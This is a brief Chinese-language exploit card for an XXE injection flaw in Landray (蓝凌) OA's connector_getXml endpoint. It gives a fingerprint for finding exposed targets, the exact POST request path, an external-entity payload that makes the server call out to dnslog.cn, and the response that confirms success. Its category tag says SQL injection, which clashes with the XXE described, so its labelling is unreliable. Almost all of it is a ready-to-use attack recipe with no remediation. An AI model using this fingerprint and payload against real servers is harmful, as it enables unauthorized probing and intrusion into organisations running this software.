# 蓝凌OAconnector_getXml存在XXE注入漏洞

蓝凌 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎登录智慧协同平台"`
- **请求**：`POST /AddressBook/connector_getdata.aspx/connector_getXml?type=add HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://dnslog.cn"> %remote;]>
```
- **响应特征**：200 dnslog回显